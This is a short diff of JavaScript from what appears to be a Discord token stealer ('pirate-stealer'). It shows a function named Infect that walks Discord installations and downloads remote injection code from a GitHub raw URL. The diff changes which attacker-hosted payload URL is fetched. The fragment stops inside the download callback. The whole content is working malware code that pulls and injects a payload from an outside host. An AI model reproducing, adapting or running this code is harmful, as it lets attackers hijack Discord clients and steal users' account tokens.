@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/Lowki1337/api/README.md/api1.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
